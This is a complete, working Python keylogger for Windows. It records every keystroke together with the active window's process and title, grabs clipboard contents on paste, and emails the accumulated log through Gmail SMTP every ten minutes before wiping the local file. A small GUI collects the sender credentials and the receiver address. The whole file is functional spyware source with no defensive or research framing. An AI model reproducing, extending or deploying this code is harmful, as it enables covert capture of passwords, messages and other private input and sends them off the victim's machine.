import os
import sys
import time
import smtplib
import threading
from ctypes import windll, byref, create_unicode_buffer, c_ulong
from email.mime.text import MIMEText
import tkinter as tk
from tkinter import simpledialog, messagebox
from pynput import keyboard
import win32clipboard


class EmailSender:
    def __init__(self, email, app_password):
        self.email = email
        self.app_password = app_password
        self.smtp_server = "smtp.gmail.com"  # or smtp-mail.outlook.com for Outlook
        self.smtp_port = 587

    def send(self, subject, body, receiver_email):
        """Transmits the log as plain text via Gmail SMTP using proper MIME encoding."""
        msg = MIMEText(body, "plain", "utf-8")
        msg["Subject"] = subject
        msg["From"] = self.email
        msg["To"] = receiver_email
        try:
            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                server.starttls()
                server.login(self.email, self.app_password)
                server.sendmail(self.email, receiver_email, msg.as_string())
            return True
        except Exception:
            return False


class KeyLogger:
    def __init__(self, sender_email=None, sender_password=None, receiver_email=None, use_email=False):
        self.log_dir = os.path.dirname(os.path.abspath(__file__))
        self.log_path = os.path.join(self.log_dir, "log.txt")
        self.user32 = windll.user32
        self.kernel32 = windll.kernel32
        self.psapi = windll.psapi
        self.current_window = None

        self.use_email = use_email
        self.receiver_email = receiver_email
        self.sender = EmailSender(sender_email, sender_password) if use_email else None
        self.interval = 600  # 10 min.
        self.ctrl_pressed = False

    def report(self):
        """Timer-based reporting loop."""
        if not self.use_email:
            return

        if os.path.exists(self.log_path):
            try:
                with open(self.log_path, "r", encoding="utf-8") as f:
                    log_content = f.read()
                if log_content.strip():
                    success = self.sender.send(
                        f"Keylogger Report - {time.ctime()}",
                        log_content,
                        self.receiver_email,
                    )
                    if success:
                        with open(self.log_path, "w", encoding="utf-8") as f:
                            f.write(f"--- Log reset after email at {time.ctime()} ---\n")
            except Exception:
                pass

        timer = threading.Timer(self.interval, self.report)
        timer.daemon = True
        timer.start()

    def get_current_process(self):
        """Captures window info using Unicode Windows API."""
        hwnd = self.user32.GetForegroundWindow()
        pid = c_ulong(0)
        self.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        h_process = self.kernel32.OpenProcess(0x410, False, pid)
        if h_process:
            try:
                executable = create_unicode_buffer(512)
                self.psapi.GetModuleBaseNameW(h_process, None, byref(executable), 512)
                window_title = create_unicode_buffer(512)
                self.user32.GetWindowTextW(hwnd, byref(window_title), 512)
                if window_title.value != self.current_window:
                    self.current_window = window_title.value
                    header = f"\n\n[ PID: {pid.value} - {executable.value} - {self.current_window} ]\n"
                    with open(self.log_path, "a", encoding="utf-8") as f:
                        f.write(header)
            finally:
                self.kernel32.CloseHandle(h_process)

    def on_press(self, key):
        """Event handler for keystrokes and clipboard."""
        self.get_current_process()
        content = ""
        try:
            if key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
                self.ctrl_pressed = True
                return

            if hasattr(key, "char") and key.char is not None:
                if self.ctrl_pressed and hasattr(key, "vk") and key.vk == 86:
                    try:
                        win32clipboard.OpenClipboard()
                        clip_data = win32clipboard.GetClipboardData()
                        win32clipboard.CloseClipboard()
                        content = f"\n[PASTE] - {clip_data}\n"
                    except Exception:
                        content = " [PASTE ERROR] "
                else:
                    content = key.char

            elif hasattr(key, "vk") and 96 <= key.vk <= 105:
                content = str(key.vk - 96)  # Numpad 0-9

            elif hasattr(key, "vk") and key.vk == 110:
                content = "."  # Numpad decimal

            else:
                key_str = str(key).replace("Key.", "")
                content = f" [{key_str}] "

            with open(self.log_path, "a", encoding="utf-8") as f:
                f.write(content)

        except Exception:
            pass

    def on_release(self, key):
        """Reset Ctrl state when released."""
        if key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
            self.ctrl_pressed = False

    def run(self):
        if self.use_email:
            self.report()

        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()


class CustomInputDialog(simpledialog.Dialog):
    """Custom GUI dialog for data inputs with a checkbox."""

    def __init__(self, parent, title):
        super().__init__(parent, title)

    def body(self, master):
        tk.Label(master, text="Sender Email:").grid(row=0, sticky="w", padx=10, pady=5)
        self.sender_entry = tk.Entry(master, width=40)
        self.sender_entry.grid(row=0, column=1, padx=10, pady=5)

        tk.Label(master, text="App Password (16-digits):").grid(row=1, sticky="w", padx=10, pady=5)
        self.password_entry = tk.Entry(master, show="*", width=40)
        self.password_entry.grid(row=1, column=1, padx=10, pady=5)

        tk.Label(master, text="Receiver Email:").grid(row=2, sticky="w", padx=10, pady=5)
        self.receiver_entry = tk.Entry(master, width=40)
        self.receiver_entry.grid(row=2, column=1, padx=10, pady=5)

        self.same_as_sender_var = tk.IntVar()
        self.checkbox = tk.Checkbutton(
            master,
            text="Same as sender email",
            variable=self.same_as_sender_var,
            command=self.toggle_receiver,
        )
        self.checkbox.grid(row=3, columnspan=2, pady=5)

        return self.sender_entry

    def toggle_receiver(self):
        if self.same_as_sender_var.get() == 1:
            self.receiver_entry.config(state="disabled")
        else:
            self.receiver_entry.config(state="normal")

    def apply(self):
        sender = self.sender_entry.get().strip()
        pwd = self.password_entry.get().strip()
        if self.same_as_sender_var.get() == 1:
            receiver = sender
        else:
            receiver = self.receiver_entry.get().strip()
        self.result = (sender, pwd, receiver)


def get_user_config():
    """GUI dialog to allow the user to input custom sender, password, and receiver combinations."""
    root = tk.Tk()
    root.withdraw()

    use_email = messagebox.askyesno(
        "Configuration",
        "Would you like to send logs via Email?\n(Selecting 'No' will save logs locally only and disable auto-reset)",
    )

    if not use_email:
        root.destroy()
        return None, None, None, False

    dialog = CustomInputDialog(root, "Email Configuration")
    root.destroy()

    if dialog.result:
        sender, pwd, receiver = dialog.result
        if not sender or not pwd or not receiver:
            return None, None, None, False
        return sender, pwd, receiver, True

    return None, None, None, False


if __name__ == "__main__":
    sender_email, sender_password, receiver_email, use_email = get_user_config()

    if use_email:
        logger = KeyLogger(
            sender_email=sender_email,
            sender_password=sender_password,
            receiver_email=receiver_email,
            use_email=True,
        )
    else:
        logger = KeyLogger(use_email=False)

    try:
        logger.run()
    except (KeyboardInterrupt, SystemExit):
        pass
